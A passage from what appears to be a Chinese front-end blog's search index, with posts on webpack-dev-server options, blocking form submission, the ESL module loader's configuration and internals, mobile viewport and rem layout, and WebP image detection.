webpack-dev-server --inline --hot 也可以在webpack.config.js中配置plugins: [ // 需要手动添加 HotModuleReplacementPlugin , 命令行的方式会自动添加 new webpack.HotModuleReplacementPlugin()],devServer: &#123; hot: true, inline: true&#125; 还可以利用express在本地起一个服务，利用webpack-dev-middleware和webpack-hot-middleware配合使用，请看配置详情和分析 webpack-dev-server选项 contentBase：默认webpack-dev-server会为根文件夹提供本地服务器，如果想为另外一个目录下的文件提供本地服务器，应该在这里设置其所在目录 port：设置默认监听端口，如果省略，默认为”8080“ inline：设置为true，当源文件改变时会自动刷新页面 colors：设置为true，使终端输出的文件为彩色的 historyApiFallback：在开发单页应用时非常有用，它依赖于HTML5 history API，如果设置为true，所有的跳转将指向index.html hot：热更新 devtool选项 source-map：在一个单独的文件中产生一个完整且功能完全的文件。这个文件具有最好的source map，但是它会减慢打包文件的构建速度； cheap-module-source-map：在一个单独的文件中生成一个不带列映射的map，不带列映射提高项目构建速度，但是也使得浏览器开发者工具只能对应到具体的行，不能对应到具体的列（符号），会对调试造成不便； eval-source-map：使用eval打包源文件模块，在同一个文件中生成干净的完整的source map。这个选项可以在不影响构建速度的前提下生成完整的sourcemap，但是对打包后输出的JS文件的执行具有性能和安全的隐患。不过在开发阶段这是一个非常好的选项，但是在生产阶段一定不要用这个选项； cheap-module-eval-source-map：这是在打包文件时最快的生成source map的方法，生成的Source Map 会和打包后的JavaScript文件同行显示，没有列映射，和eval-source-map选项具有相似的缺点；]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[表单提交问题]]></title>
      <url>http://yoursite.com/2016/05/12/form-submit/</url>
      <content type="text"><![CDATA[表单提交方式 input[type=submit] button[type=submit] input[type=image] form对象调用submit()方法 submit事件 阻止表单提交 设置提交按钮disabled属性 调用submit事件 1、调用submit方法的时候不会触发submit事件，但是与之对应的有一个重置表单方法reset，调用后会触发reset事件。2、在点击提交按钮的时候，先触发click事件，再触发submit事件3、type=image的表单元素通过表单 elements 属性是获取不到的 submit事件demo1绑定myform.onsubmit = function()&#123; return false;&#125; 这种方式直接返回false即可 demo2绑定function addListener(element, type, handler)&#123; if (!element) &#123; return; &#125; if (element.addEventListener) &#123; element.addEventListener(type, handler, false); &#125; else &#123;//for ie element.attachEvent("on" + type, handler); &#125; &#125;addListener(obj, 'submit', function()&#123; return false&#125;); 以上提交方式在ie下可以阻止表单提交，但是在ff或者chrome却不行，究其原因是addListener中的事件处理函数没有返回值，写了也白写！ The listener parameter is a EventListener object.Object EventListener：This is an ECMAScript function reference. This method has no return value. The parameter is a Event object. 解决方法：addListener(obj, 'submit', function(e)&#123; var e = e || window.event; if(e.preventDefault)&#123; e.preventDefault(); &#125;else&#123; e.returnValue = false; &#125;&#125;); 脚本处理完自己的工作后由元素处理事件，元素可以通过事件对象判断是否执行默认操作！]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[PS一键切图]]></title>
      <url>http://yoursite.com/2016/05/11/ps-shortCut/</url>
      <content type="text"><![CDATA[作为一名前端，明天都在做着重复的切图工作，如果方法不佳，会浪费大把的生命，下面小生介绍一个切图小技巧，提高一下工作效率！ 步骤 点击下载一键切图 载入：菜单栏—&gt;窗口—&gt;动作，按照此步骤打开动作面板，点击面板右上角（见图中红框），出现下拉菜单，选择‘载入动作’，然后将刚才下载的‘一键切图动作’载入。 选择一张psd图，选中其中一个图层，按F2，奇迹就会发生！]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ESL之config配置]]></title>
      <url>http://yoursite.com/2016/05/10/esl-config/</url>
      <content type="text"><![CDATA[config默认配置var requireConf = &#123; baseUrl: './', paths: &#123;&#125;, config: &#123;&#125;, map: &#123;&#125;, packages: [], waitSeconds: 0, noRequests: &#123;&#125;, urlArgs: &#123;&#125; &#125;; 所有的配置初始化在createConfIndex函数中完成 baseUrl在整个源码中只有以下两处出现过：createConfIndex对baseUrl的处理//处理末尾有或者没有‘/’requireConf.baseUrl = requireConf.baseUrl.replace(/\/$/, '') + '/'; 对于baseUrl，末尾可以有“/”也可以没有！ 在toUrl函数中拼接模块的url// 相对路径时，附加baseUrl(url前面不能有"/") if (!/^([a-z]&#123;2,10&#125;:\/)?\//i.test(url)) &#123; url = requireConf.baseUrl + url; &#125; 在加载模块时，会把所有的要通过script标签加载define文件的url前面拼接baseUrl paths配置 require.config(&#123; baseUrl: "http://j2.58cdn.com.cn/m58/njs/", paths: &#123; test: "pkg/house" &#125; &#125;); require(['test/ershoufang_list'], function() &#123; console.log('pkg ershoufang_list callback') &#125;); createConfIndex对paths的处理pathsIndex = createKVSortedIndex(requireConf.paths);//处理结果pathsIndex = &#123; k: "test", reg: /^test(\/|$)/, //前缀匹配 v: "pkg/house"&#125; toUrl的处理// paths处理和匹配var isPathMap;// 将url中的key用pathsIndex中value替换indexRetrieve(id, pathsIndex, function(value, key) &#123; url = url.replace(key, value); isPathMap = 1;&#125;);// 如果pathsIndex没有匹配，就用packagesIndex处理urlif (!isPathMap) &#123; indexRetrieve(id, packagesIndex, function(value, key, item) &#123; url = url.replace(item.name, item.location); &#125;);&#125; 相当于在url中用paths的key作为模块id的一部分，而其value才是url真实的一部分，并且packages和paths是互斥的！ packages配置require.config(&#123; baseUrl: "http://j2.58cdn.com.cn/m58/njs/", packages: [&#123; name: "test", location: "pkg/house", main: "ershoufang_list", &#125;] &#125;); require(['test'], function() &#123; console.log('pkg ershoufang_list callback') &#125;); createConfIndex对packages的处理packagesIndex = []; each(requireConf.packages, function(packageConf) &#123; var pkg = packageConf; if (typeof packageConf === 'string') &#123; pkg = &#123; name: packageConf.split('/')[0], location: packageConf, main: 'main' &#125;; &#125; pkg.location = pkg.location || pkg.name; pkg.main = (pkg.main || 'main').replace(/\.js$/i, ''); pkg.reg = createPrefixRegexp(pkg.name); //前缀匹配name packagesIndex.push(pkg); &#125; ); packagesIndex.sort(descSorterByKOrName); packagesIndex一般会有name、location、main和reg这四个属性 在normalize中//packagesIndex中某项的name属性与moduleId相同，就将main属性拼接在moduleId之后 each(packagesIndex, function(packageConf) &#123; var name = packageConf.name; if (name === moduleId) &#123; moduleId = name + '/' + packageConf.main; return false; &#125; &#125; ); packagesIndex的name属性与moduleId匹配时，把main属性拼接上 toUrl的处理// paths处理和匹配var isPathMap;// 将url中的key用pathsIndex中value替换indexRetrieve(id, pathsIndex, function(value, key) &#123; url = url.replace(key, value); isPathMap = 1;&#125;);// 如果pathsIndex没有匹配，就用packagesIndex处理urlif (!isPathMap) &#123; indexRetrieve(id, packagesIndex, function(value, key, item) &#123; url = url.replace(item.name, item.location); &#125;);&#125; 如果匹配，就用packagesIndex的location属性替换url中的name部分 map配置require.config(&#123; baseUrl: "http://j2.58cdn.com.cn/m58/njs/", map: &#123; "pkg/house/ershoufang_list": &#123; "test": "mod/common" &#125; &#125; &#125;); require(['pkg/house/ershoufang_list'], function() &#123; console.log('pkg ershoufang_list callback') &#125;); createConfIndex中的处理mappingIdIndex = createKVSortedIndex(requireConf.map, 1); each(mappingIdIndex, function(item) &#123; item.v = createKVSortedIndex(item.v); &#125; ); normalize中的处理// mappingIdIndex=[&#123;reg1:xx,k1:xx,v1:&#123;reg2:xx,k2:xx,v2:xx&#125;&#125;]，reg1匹配baseId，reg2匹配moduleId,将moduleId中的k2用v2替换 indexRetrieve(baseId, mappingIdIndex, function(value) &#123; indexRetrieve(moduleId, value, function(mdValue, mdKey) &#123; moduleId = moduleId.replace(mdKey, mdValue); &#125; ); &#125;); map就是paths多一层，先匹配父模块的id，再匹配子模块的id，最后替换的是子模块的id urlArgs配置require.config(&#123; // ... urlArgs: 'v=2.0.0' // 指定所有模块的路径后参数&#125;);require.config(&#123; // ... urlArgs: &#123; common: '1.2.0' // 为common和common下的子模块指定路径后参数 &#125;&#125;); createConfIndex中的处理urlArgsIndex = createKVSortedIndex(requireConf.urlArgs); require.config中的处理if (newValue) &#123; if (key === 'urlArgs' &amp;&amp; typeof newValue === 'string') &#123; defaultUrlArgs = newValue; &#125; else &#123; 在urlArgs设置为字符串时，会赋值给defaultUrlArgs toUrl中的处理// 拼接查询字段，如果urlArgsIndex拼接了，defaultUrlArgs就不用拼接 var isUrlArgsAppended; indexRetrieve(id, urlArgsIndex, function(value) &#123; appendUrlArgs(value); &#125;); defaultUrlArgs &amp;&amp; appendUrlArgs(defaultUrlArgs); urlArgs主要作用是在模块的url上拼接一个查询字符串 waitSeconds配置require.config(&#123; // ... waitSeconds: 5&#125;); 指定等待的秒数。超过等待时间后，如果有模块未成功加载或初始化，将抛出 MODULE_TIMEOUT 异常错误信息。 noRequests配置require.config(&#123; baseUrl: "http://j2.58cdn.com.cn/m58/njs/", noRequests: &#123; "pkg/house/ershoufang_list": ["pkg/house/ershoufang_list"] &#125; &#125;); require(['pkg/house/ershoufang_list'], function() &#123; console.log('pkg ershoufang_list callback') &#125;); createConfIndex中的处理noRequestsIndex = createKVSortedIndex(requireConf.noRequests); each(noRequestsIndex, function(item) &#123;//[&#123;reg:xx,k:xx,v:[xx,xx]&#125;] var value = item.v; var mapIndex = &#123;&#125;; item.v = mapIndex; if (!(value instanceof Array)) &#123; value = [value]; &#125; each(value, function(meetId) &#123; //[&#123;reg:xx,k:xx,v:&#123;xx:1,xx:1&#125;&#125;] mapIndex[meetId] = 1; &#125;); &#125;); actualGlobalRequire函数中的处理each(pureModules, function(id) &#123; var meet; // noRequestsIndex = //[&#123;reg:xx,k:xx,v:&#123;xx:1,xx:1&#125;&#125;] // reg要匹配id，v值的属性还要存在一个pureModules indexRetrieve(id, noRequestsIndex, function(value) &#123; meet = value; &#125;); if (meet) &#123; if (meet['*']) &#123; noRequestModules[id] = 1; &#125; else &#123; each(pureModules, function(meetId) &#123; if (meet[meetId]) &#123; noRequestModules[id] = 1; return false; &#125; &#125;); &#125; &#125; &#125;); nativeRequire( pureModules, function() &#123; //require回调函数所在 each(normalizedIds, function(id, i) &#123; if (id == null) &#123; normalizedIds[i] = normalize(requireId[i], baseId); // 对有感叹号的id做处理 &#125; &#125;); nativeRequire(normalizedIds, callback, baseId); &#125;, baseId, noRequestModules ); native中的处理each(ids, function(id) &#123; if (!(BUILDIN_MODULE[id] || modIs(id, MODULE_DEFINED))) &#123; modAddDefinedListener(id, tryFinishRequire); //为没有达到MODULE_DEFINED的模块增加监听函数 if (!noRequests[id]) &#123; //若存在就不加载 (id.indexOf('!') &gt; 0 ? loadResource : loadModule)(id, baseId); &#125; &#125;&#125;); noRequests的作用就是拒绝加载require中引入的模块]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ESL模块处理过程]]></title>
      <url>http://yoursite.com/2016/05/10/esl-run-route/</url>
      <content type="text"><![CDATA[ESL是什么ESL是一个浏览器端、符合AMD的标准加载器，适合于现代web浏览器端应用的入口与模块管理。相比于RequireJS拥有以下优点： 体积更小 性能更高 更健壮 不支持非浏览器端使用 依赖模块用时定义 ESL模块加载详解 esl.js加载模块过程如下： 1、require引入模块的入口，调用nativeRequire，在这个函数中通过tryFinishRequire绑定require的callback，并且把tryFinishRequire作为监听函数绑在入口模块上； 2、nativeRequire通过loadModule加载入口js文件即define文件，并且通过onload绑定一个监听函数loadedListener； 3、define函数生产出模块的id、依赖模块和callback； 4、等到define文件执行完成，loadedListener会通过completePreDefine将模块数据加入到modModules中； 5、最后通过modAnalyse分析依赖模块的属性以及处理url，其中会调用modAutoInvoke（核心函数）处理最后的结果，如果依赖的模块还存在没有加载的，再次统一放入nativeRequire中，循环上面的过程！ 核心函数modAutoInvoke分析//核心函数 递归设置所有模块状态为3，递归执行所有invokeFactory function modAutoInvoke() &#123; for (var id in autoDefineModules) &#123; modUpdatePreparedState(id); //一次性设置有依赖关系的模块为状态3 modTryInvokeFactory(id); &#125; &#125; autoDefineModules数组存放着作为入口的模块； modUpdatePreparedState的作用：采用递归遍历所有模块，检测依赖的模块是否都是状态3，如果是，autoDefineModules中对应的模块状态可以设置为3，如果不是，则不能设置为3； modTryInvokeFactory的作用是在autoDefineModules中模块状态达到3时，执行InvokeFactory； //invokeFactory中的两段代码 each(module.factoryDeps, function(dep) &#123; var depId = dep.absId; if (!BUILDIN_MODULE[depId]) &#123; modTryInvokeFactory(depId); //递归执行依赖模块的invokeFactory if (!modIs(depId, MODULE_DEFINED)) &#123; //所有依赖的模块必须达到MODULE_DEFINED factoryReady = 0; return false; &#125; &#125; factoryDeps.push(depId); //达到MODULE_DEFINED状态的模块被推入factoryDeps中 &#125; ); //所有依赖的模块必须达到MODULE_DEFINED就可以执行下面的代码 if (factoryReady) &#123; try &#123; var args = modGetModulesExports( //依赖模块的输出 factoryDeps, &#123; require: module.require, exports: module.exports, module: module &#125; ); var factory = module.factory; var exports = typeof factory === 'function' ? factory.apply(global, args) : factory; if (exports != null) &#123; module.exports = exports; &#125; module.invokeFactory = null; &#125; catch (ex) &#123;&#125; modDefined(id); //设置为状态4,执行监听函数 &#125; &#125;&#125; 以上是invokeFactory中的两段代码，这个函数的作用就是输出模块的执行结果，但是在输出自身之前必须通过modTryInvokeFactory递归所有依赖的模块，这些依赖的模块也都必须输出执行结果，赋值在exports中，供父模块调用！ 核心函数modAutoInvoke调用在整个源文件中，调用modAutoInvoke主要有两处，一个是modAnalyse最后执行，在当前模块分析完毕，状态达到2时调用，另外一处是nativeRequire中！核心思想就是在每处理一个模块，都要从入口模块递归依赖的所有模块，以达到一旦所有模块准备就绪，就可以执行require的callback函数！ demo]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[viewport]]></title>
      <url>http://yoursite.com/2016/05/07/viewport/</url>
      <content type="text"><![CDATA[viewport的概念layout viewport通俗的讲，移动设备上的viewport就是设备的屏幕上能用来显示我们的网页的那一块区域，在具体一点，就是浏览器上(也可能是一个app中的webview)用来显示网页的那部分区域，但viewport又不局限于浏览器可视区域的大小，它可能比浏览器的可视区域要大，也可能比浏览器的可视区域要小。在默认情况下，一般来讲，移动设备上的viewport都是要大于浏览器可视区域的，这是因为考虑到移动设备的分辨率相对于桌面电脑来说都比较小，所以为了能在移动设备上正常显示那些传统的为桌面浏览器设计的网站，移动设备上的浏览器都会把自己默认的viewport设为980px或1024px（也可能是其它值，这个是由设备自己决定的），但带来的后果就是浏览器会出现横向滚动条，因为浏览器可视区域的宽度是比这个默认的viewport的宽度要小的。下图是一些设备上浏览器的默认viewport的宽度。这个layout viewport的宽度可以通过 document.documentElement.clientWidth 来获取。 visual viewport它是在不同的缩放（initial-scale）情况下浏览器可视区域的大小（需要多少css像素填充），visual viewport的宽度可以通过window.innerWidth 来获取，但在Android 2, Oprea mini 和 UC 8中无法正确获取。 ideal viewport这个viewport可以理解为最适合当前机型的viewport。不同的手机的可能拥有不同的ideal viewport,一般iphone手机都是320px，但是安卓设备就比较复杂了，有320px的，有360px的，有384px的等等，关于不同的设备ideal viewport的宽度都为多少，可以到http://viewportsizes.com去查看一下，里面收集了众多设备的理想宽度。 像素的理解物理像素(physical pixel)一个物理像素是显示器(手机屏幕)上最小的物理显示单元，在操作系统的调度下，每一个设备像素都有自己的颜色值和亮度值。 设备独立像素(density-independent pixel)设备独立像素(也叫密度无关像素)，可以认为是计算机坐标系统中得一个点，这个点代表一个可以由程序使用的虚拟像素(比如: css像素)，然后由相关系统转换为物理像素。 设备像素比(device pixel ratio )定义了物理像素和设备独立像素的对应关系，它的值可以按如下的公式的得到： 设备像素比 = 物理像素 / 设备独立像素 // 在某一方向上，x方向或者y方向 在js中，dpr = window.devicePixelRatio 在css中，可以通过-webkit-device-pixel-ratio，-webkit-min-device-pixel-ratio和 -webkit-max-device-pixel-ratio进行媒体查询，对不同dpr的设备，做一些样式适配(这里只针对webkit内核的浏览器和webview)。 综合上面几个概念，一起举例说明下： 以iphone6为例：设备宽高为375×667，可以理解为设备独立像素(或css像素)。dpr为2，根据上面的计算公式，其物理像素就应该×2，为750×1334。在css像素大小不变的情况下，普通屏幕下，1个css像素 对应 1个物理像素(1:1)，retina屏幕下，1个css像素对应 4个物理像素(1:4)。 meta.viewport详解几个概念一般在做移动端页面时，会把这行代码复制到页面中。该meta标签的作用是让当前viewport的宽度等于设备的宽度，同时不允许用户对其进行缩放。一般，width设置layout viewport 的宽度，为一个正整数，或字符串”width-device”；initial-scale 设置页面的初始缩放值，为一个数字，可以带小数；minimum-scale允许用户的最小缩放值，为一个数字，可以带小数；maximum-scale 允许用户的最大缩放值，为一个数字，可以带小数；user-scalable 是否允许用户进行缩放，值为”no”或”yes”, no 代表不允许，yes代表允许。当然还可以设置其他的值，用逗号隔开就可以。 width和initial-scale在移动端页面中的作用（1）通过width=device-width，所有浏览器都能把当前的viewport宽度变成ideal viewport的宽度，但要注意的是，在iphone和ipad上，无论是竖屏还是横屏，宽度都是竖屏时ideal viewport的宽度。（2）initial-scale的缩放是相对于ideal viewport来进行缩放的，当对ideal viewport进行100%的缩放，也就是缩放值为1的时候，得到的就是ideal viewport（3）ideal viewport的值会取width和initial-scale两个中较大的那个值 关于initial-scale的缩放initial-scale是对页面就行缩放（个人理解就是缩放单位css像素的大小），测试如下，在meta中去掉width这一项，visual viewport得出如下数据：从上图可以看出，在屏幕宽度不变的情况下，当initial-scale变小，预示着css像素变小，导致填充整个屏幕需要的css像素就会变多。因此，我们可以得出一个公式：visual viewport宽度 = ideal viewport宽度 / 当前缩放值 关于width去掉initial-scale，测试width。当width=160时，这是因为有些元素把宽高都写死了，此时initial-scale=2，元素都变为原来的2倍，所以导致页面很挤。当width=1280时，这是因为有些元素把宽高都写死了，此时initial-scale=2，元素都变为原来的0.25倍，所以导致页面的元素很小。 结论在iphone和ipad上，无论你给viewport设的宽的是多少，如果没有指定默认的缩放值，则iphone和ipad会自动计算这个缩放值，以达到当前页面不会出现横向滚动条(或者说viewport的宽度就是屏幕的宽度)的目的。安卓设备上的initial-scale默认值好像没有方法能够得到，或者就是干脆它就没有默认值，一定要你显示的写出来这个东西才会起作用！ 利用meta.viewport对多屏适配布局retina下，border: 1px问题经常border：1px在不同手机上的宽度不一样，如下：上图中，对于一条1px宽的直线，它们在屏幕上的物理尺寸(灰色区域)的确是相同的，不同的其实是屏幕上最小的物理显示单元，即物理像素，所以对于一条直线，iphone5它能显示的最小宽度其实是图中的红线圈出来的灰色区域，用css来表示，理论上说是0.5px。所以，设计师想要的retina下border:1px;，其实就是1物理像素宽，对于css而言，可以认为是border: 0.5px;，这是retina下(dpr=2)下能显示的最小单位。 多屏适配布局移动端布局，为了适配各种大屏手机，目前最好用的方案莫过于使用相对单位rem。rem = document.documentElement.clientWidth * dpr / 10 javascript方式，通过上面的公式，计算出基准值rem，然后写入样式。 以下是淘宝的代码： (function (doc, win) &#123; var docEl = doc.documentElement, resizeEvt = 'orientationchange' in window ? 'orientationchange' : 'resize', recalc = function () &#123; var clientWidth = docEl.clientWidth; if (!clientWidth) return; docEl.style.fontSize = 20 * (clientWidth / 320) + 'px'; &#125;; if (!doc.addEventListener) return; win.addEventListener(resizeEvt, recalc, false); doc.addEventListener('DOMContentLoaded', recalc, false);&#125;)(document, window); 可以看出，他们也仅仅按照手机屏幕的宽度在做适配，没有动用dpr和scale，个人认为这两个必须同时运用，页面才会在理想情况下展现！ 一般方法大概如下： var dpr, rem, scale;var docEl = document.documentElement;var fontEl = document.createElement('style');var metaEl = document.querySelector('meta[name="viewport"]');dpr = win.devicePixelRatio || 1;scale = 1 / dpr;rem = docEl.clientWidth * dpr / 10;// 设置viewport，进行缩放，达到高清效果metaEl.setAttribute('content', 'width=' + dpr * docEl.clientWidth + ',initial-scale=' + scale + ',maximum-scale=' + scale + ', minimum-scale=' + scale + ',user-scalable=no');// 设置data-dpr属性，留作的css hack之用docEl.setAttribute('data-dpr', dpr);// 动态写入样式docEl.firstElementChild.appendChild(fontEl);fontEl.innerHTML = 'html&#123;font-size:' + rem + 'px!important;&#125;';// 给js调用的，某一dpr下rem和px之间的转换函数window.rem2px = function(v) &#123; v = parseFloat(v); return v * rem;&#125;;window.px2rem: function(v) &#123; v = parseFloat(v); return v / rem;&#125;;window.dpr = dpr;window.rem = rem; 以上设置是为了保证，1个css像素占据一个物理像素。如果有一个区块，在psd文件中量出：宽高750×300px的div，那么如何转换成rem单位呢？如果scale是1，对于iphone6来说就是取一半，如果scale是0.5，量出多少是多少，换句话说就是设计稿的宽度W=docEl.clientWidth * dpr，对于不符合的设计稿，计算公式如下：我们现在写页面参考的机型一般是iphone4以上，dpr一般都是2，所以按照以上写法其实只有viewport的宽度在起作用，但是如果遇到宽度和dpr都不一样的时候，两者的倍数都会起作用，如果遇到iphone3这样的，宽度不变而dpr变化的，它上面的元素就会比iphone4要小，遇到这样的机型，如果不改变scale，样式有可能出问题！]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[移动端之webp图片]]></title>
      <url>http://yoursite.com/2016/04/27/image-to-webp/</url>
      <content type="text"><![CDATA[webp是什么？WebP格式，谷歌（google）开发的一种旨在加快图片加载速度的图片格式。图片压缩体积大约只有JPEG的2/3，并能节省大量的服务器带宽资源和数据空间。Facebook Ebay等知名网站已经开始测试并使用WebP格式。但WebP是一种有损压缩。相较编码JPEG文件，编码同样质量的WebP文件需要占用更多的计算资源。 目前使用情况国外的网站：Youtube、Facebook.etc国内的网站：腾讯、淘宝、美团等 webp兼容性支持chrome opera4s uc5 uc5s uc6 uc6s uc华为荣耀6 qq内置浏览器 微信 uc 自带浏览器魅族 微信 uc 自带浏览器三星（Galay S4） uc 自带浏览器 QQ浏览器红米1s（andr4.3） uc QQ浏览器-v6.4.1 自带浏览器 不支持58app-v6.5.74s safari5 safari5s safari6 safari6s safari5s qq内置浏览器6 qq内置浏览器6s qq内置浏览器QQ浏览器-v6.0QQ浏览器-v6.45微信5s微信6微信6s微信5s 高速浏览器 如何转换智图iSpartalibwebp 如何使用js检测，准备两套图片路径var kTestImages = &#123; lossy: "UklGRiIAAABXRUJQVlA4IBYAAAAwAQCdASoBAAEADsD+JaQAA3AAAAAA", lossless: "UklGRhoAAABXRUJQVlA4TA0AAAAvAAAAEAcQERGIiP4HAA==", alpha: "UklGRkoAAABXRUJQVlA4WAoAAAAQAAAAAAAAAAAAQUxQSAwAAAARBxAR/Q9ERP8DAABWUDggGAAAABQBAJ0BKgEAAQAAAP4AAA3AAP7mtQAAAA==", animation: "UklGRlIAAABXRUJQVlA4WAoAAAASAAAAAAAAAAAAQU5JTQYAAAD/////AABBTk1GJgAAAAAAAAAAAAAAAAAAAGQAAABWUDhMDQAAAC8AAAAQBxAREYiI/gcA"&#125;;var img = new Image();img.onload = function () &#123; var result = (img.width &gt; 0) &amp;&amp; (img.height &gt; 0); callback(feature, result);&#125;;img.onerror = function () &#123; callback(feature, false);&#125;;img.src = "data:image/webp;base64," + kTestImages[feature];&#125; 使用webp.js插件将会捕捉页面中使用WebP格式的img元素，并用Flash进行替换。图像的解码及显示都在Flash中完成，因此目前版本对CSS设置的背景图片无效。当然，作为JPEG格式的替换，只有对较大的图像使用才有意义，否则过多的解码将消耗大量的资源。3、用html5中提供的picture元素选择图片格式（浏览器支持的情况不好） server-response（Accept和varry）Acceptiphone4suc无Accept请求头Safari Accept:*/*微信 Accept:*/*QQ浏览器-v6.4 Accept:*/*小米4uc：Accept:image/webp自带浏览器：Accept:image/webpchrome：Accept:image/webpQQ浏览器：Accept:image/webp并不是所有的请求头都包含images/webp 目前只有opera有 varry(client) &gt; Accept: image/jpeg, image/png, image/mif(server) &gt; Content-Type: image/mif &gt; Vary: Accept &gt; (object) 优势WebP is a new image format that provides lossless and lossy compression for images on the web. WebP lossless images are 26% smaller in size compared to PNGs. WebP lossy images are 25-34% smaller in size compared to JPEG images at equivalent SSIM index. WebP supports lossless transparency (also known as alpha channel) with just 22% additional bytes. Transparency is also supported with lossy compression and typically provides 3x smaller file sizes compared to PNG when lossy compression is acceptable for the red/green/blue color channels. 参考文献：WebP 探寻之路A new image format for the WebDeploying New Image Formats on the WebHow To Reduce Image Size With WebP Automagically让你的页面支持WebP图像]]></content>
    </entry>

    
  
  
</search>
